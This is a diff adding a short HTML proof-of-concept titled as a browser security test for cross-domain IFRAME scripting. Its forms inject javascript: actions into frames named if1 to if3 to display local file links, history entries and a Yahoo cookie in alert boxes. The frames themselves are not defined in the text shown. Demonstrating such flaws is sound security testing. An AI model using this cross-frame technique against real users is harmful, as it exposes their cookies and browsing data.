@@ -1,0 +1,24 @@
+<HTML>
+
+<HEAD>
+<TITLE>
+Test case browser security: cross domain scripting IFRAME exploits
+</TITLE>
+</HEAD>
+
+<BODY>
+<form action="javascript:alert('Names of five files from c:\ coming up');for(i=document.links.length-6;i<document.links.length; i++) alert(document.links[i].href)" target="if1">
+<input type="submit" value="Read files from c:\">
+</FORM>
+
+
+<form action="javascript:alert('Five addresses from your history coming up');for(i=document.links.length-5;i<document.links.length; i++) alert(document.links[i].href);" target="if2">
+<input type="submit" value="Read history">
+</FORM>
+
+<form action="javascript:alert('Yahoo has set this cookie:');alert(document.cookie);" target="if3">
+
+<input type="submit" value="Read Yahoo cookie">
+</FORM>
+
+</body></HTML>
